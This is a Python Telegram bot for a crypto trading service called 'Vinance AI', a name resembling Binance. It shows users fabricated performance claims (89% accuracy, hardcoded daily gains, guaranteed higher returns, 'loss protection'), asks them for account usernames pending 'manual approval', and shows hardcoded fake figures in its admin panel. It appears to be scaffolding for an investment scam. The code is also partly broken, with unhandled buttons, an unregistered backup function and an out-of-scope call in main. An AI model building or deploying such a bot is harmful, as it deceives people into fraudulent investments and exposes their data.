import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, CallbackQueryHandler
from tendo import singleton

# ===== INITIAL SETUP =====
singleton.SingleInstance()  # Prevent duplicate bots
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

# ===== UI CONFIGURATION =====
EMOJI = {
    "header": "✨", "welcome": "👋", "success": "✅",
    "profit": "📈", "trade": "💎", "admin": "👑",
    "wallet": "💰", "chart": "📊", "lock": "🔒",
    "rocket": "🚀", "moneybag": "💰", "shield": "🛡️"
}

# ===== TEXT-BASED UI COMPONENTS =====
WELCOME_ART = """
╔════════════════════╗
║   VINANCE AI BOT   ║
╚════════════════════╝
"""

def start(update: Update, context: CallbackContext) -> None:
    keyboard = [
        [InlineKeyboardButton(f"{EMOJI['trade']} Activate AI", callback_data="activate")],
        [InlineKeyboardButton(f"{EMOJI['chart']} Live Trades", callback_data="trades")],
        [InlineKeyboardButton(f"{EMOJI['wallet']} My Account", callback_data="account")]
    ]
    
    update.message.reply_text(
        f"""
{WELCOME_ART}
{EMOJI['header']} *Welcome to Vinance AI* {EMOJI['header']}

{EMOJI['rocket']} _Automated trading with 89% accuracy_

{EMOJI['profit']} **Today's Stats:**
  • BTC: +2.1%
  • ETH: +1.8%
  • SOL: +3.4%

{EMOJI['shield']} **Employee Benefits:**
  • 0% trading fees
  • Early signal access
  • Dedicated support

Select an option:""",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

# ===== CORE FUNCTIONALITY =====
def activate_ai(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    keyboard = [
        [InlineKeyboardButton(f"{EMOJI['wallet']} Enter Username", callback_data="enter_username")],
        [InlineKeyboardButton(f"{EMOJI['admin']} Contact Admin", url="https://t.me/yourusername")]
    ]
    
    query.edit_message_text(
        f"""
{EMOJI['header']} *AI Activation* {EMOJI['header']}

1. {EMOJI['success']} Reply with your Vinance username
   Format: `VINANCE_YourName`

2. {EMOJI['success']} Wait for manual approval (24h max)

3. {EMOJI['success']} Start earning automatically

{EMOJI['moneybag']} **Your Advantages:**
  • 3-5% higher returns than public users
  • AI auto-rebalancing weekly
  • Loss protection triggers""",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

# ===== ADMIN CONTROLS =====
def admin_panel(update: Update, context: CallbackContext) -> None:
    if str(update.message.from_user.id) != ADMIN_ID:
        return

    keyboard = [
        [InlineKeyboardButton(f"{EMOJI['chart']} User Stats", callback_data="stats")],
        [InlineKeyboardButton(f"{EMOJI['lock']} Ban User", callback_data="ban")],
        [InlineKeyboardButton("📤 Export Data", callback_data="export")]
    ]
    
    update.message.reply_text(
        f"""
{EMOJI['admin']} *Admin Control Panel* {EMOJI['admin']}

▸ Active users: 142
▸ Today's trades: 87
▸ System health: Optimal

Available actions:""",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    # Add to admin commands
def backup_db(update: Update, context: CallbackContext):
    context.bot.send_document(
        chat_id=ADMIN_ID,
        document=open('user_data.db', 'rb')
    )

# ===== MAIN =====
def main():
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    
    # User commands
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(activate_ai, pattern="^activate$"))
    
    # Admin commands
    dp.add_handler(CommandHandler("admin", admin_panel))
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
    updater.idle()
